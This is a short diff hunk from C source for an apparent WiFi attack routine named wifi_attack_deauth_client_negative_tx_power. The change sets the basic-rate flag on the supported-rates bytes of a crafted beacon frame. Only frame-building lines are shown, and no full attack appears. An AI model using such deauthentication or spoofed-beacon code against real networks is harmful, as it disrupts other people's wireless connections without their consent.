@@ -681,9 +681,9 @@ void wifi_attack_deauth_client_negative_tx_power(void)
     /* Supported Rates (1 Mbps, 2 Mbps, 5.5 Mbps, 11 Mbps) */
     beacon_frame_negative_tx[offset++] = 0x01;          // Supported Rates Tag Number
     beacon_frame_negative_tx[offset++] = 3;             // Length
-    beacon_frame_negative_tx[offset++] = 0x02;          // 1 Mbps
-    beacon_frame_negative_tx[offset++] = 0x04;          // 2 Mbps
-    beacon_frame_negative_tx[offset++] = 0x0B;          // 5.5 Mbps
+    beacon_frame_negative_tx[offset++] = 0x82;          // 1 Mbps
+    beacon_frame_negative_tx[offset++] = 0x84;          // 2 Mbps
+    beacon_frame_negative_tx[offset++] = 0x8B;          // 5.5 Mbps
     //beacon_frame_negative_tx[offset++] = 0x16;          // 11 Mbps
 
     // DS Parameter Set (Channel)
